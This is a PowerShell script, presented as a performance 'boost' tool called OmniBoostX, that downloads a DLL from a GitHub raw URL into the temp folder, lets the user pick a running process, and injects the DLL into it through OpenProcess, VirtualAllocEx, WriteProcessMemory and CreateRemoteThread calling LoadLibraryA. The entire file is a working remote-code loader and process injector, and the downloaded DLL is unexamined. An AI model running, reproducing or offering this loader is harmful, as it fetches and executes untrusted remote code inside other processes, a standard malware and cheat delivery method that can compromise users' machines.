# --- CONFIGURATION ---
$GithubDllUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/OmniBoostX.dll"
$LocalDllPath = "$env:TEMP\OmniBoostX.dll"
# ---------------------

# 1. Download DLL from GitHub
Write-Host "[*] Downloading OmniBoostX from GitHub..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $GithubDllUrl -OutFile $LocalDllPath -ErrorAction Stop
    Write-Host "[+] Download Complete: $LocalDllPath" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download DLL. Check your URL!" -ForegroundColor Red
    return
}

# 2. Process Selection
Write-Host "[*] Fetching running processes..." -ForegroundColor Cyan
$Processes = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Name, Id, MainWindowTitle
$SelectedProcess = $Processes | Out-GridView -Title "Select Process to Boost with OmniBoostX" -OutputMode Single

if (-not $SelectedProcess) {
    Write-Host "[-] No process selected. Exiting." -ForegroundColor Yellow
    return
}

$ProcessName = $SelectedProcess.Name
$ProcessId = $SelectedProcess.Id
Write-Host "[*] Targeting: $ProcessName (PID: $ProcessId)" -ForegroundColor Magenta

# 3. Injection Logic (Win32 API)
$Win32Functions = @'
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
'@

$Kernel32 = Add-Type -MemberDefinition $Win32Functions -Name "Win32Inject" -PassThru -ErrorAction SilentlyContinue

$hProcess = $Kernel32::OpenProcess(0x1F0FFF, $false, $ProcessId)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[-] Could not open process. Try running as Admin!" -ForegroundColor Red
    return
}

$DllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($LocalDllPath + "`0")
$AllocMem = $Kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$DllPathBytes.Length, 0x3000, 0x04)
$Kernel32::WriteProcessMemory($hProcess, $AllocMem, $DllPathBytes, [uint32]$DllPathBytes.Length, [ref]0)
$LoadLib = $Kernel32::GetProcAddress($Kernel32::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
$hThread = $Kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $LoadLib, $AllocMem, 0, [IntPtr]::Zero)

if ($hThread -ne [IntPtr]::Zero) {
    Write-Host "[+++] OMNIBOOSTX INJECTED SUCCESSFULLY!" -ForegroundColor Green -BackgroundColor DarkGreen
} else {
    Write-Host "[-] Injection failed." -ForegroundColor Red
}
